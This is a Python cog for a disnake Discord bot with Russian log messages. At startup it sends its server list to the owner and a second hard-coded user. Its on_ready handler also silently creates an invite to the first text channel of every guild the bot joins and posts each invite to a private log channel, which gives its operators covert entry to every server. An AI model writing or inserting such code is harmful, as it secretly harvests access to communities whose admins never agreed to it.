import disnake as discord
from disnake.ext import commands
import datetime
from discord_together import DiscordTogether
from config import *
import time
from asyncio import sleep
start = round(time.time())
class Ready(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.Cog.listener()
    async def on_ready(self):
        print('Бот запущен!')
        print('Готов под именем ---->', self.bot.user)
        print('ID:', self.bot.user.id)
        self.bot.togetherControl = await DiscordTogether(token)
        print(datetime.datetime.now())
        global logs, admin1, admin2
        guildList = []
        for guild in self.bot.guilds:
            guildList.extend(''.join(guild.name + "\n"))

        admin1 = self.bot.get_user(self.bot.owner.id)
        admin2 = self.bot.get_user(goldy)
        logs = self.bot.get_channel(logs_ch)
        guilds = ''.join(guildList)
        await admin1.send(f"Я перезапущен под именем {self.bot.user.name} в <t:{start}:F>\nМои сервера:\n>>> {guilds}")
        await admin2.send(f"Я перезапущен под именем {self.bot.user.name} в <t:{start}:F>\nМои сервера:\n>>> {guilds}")
        global owners
        for guild in self.bot.guilds:
            inv = await guild.text_channels[0].create_invite()
            await logs.send(inv)
        owners = [admin1.id, admin2.id]
        while True:
            for status in statuses:
                await self.bot.change_presence(activity = discord.Activity(type=discord.ActivityType.watching, name=status, status = discord.Status.idle))
                await sleep(5)
def setup(bot):
    bot.add_cog(Ready(bot))
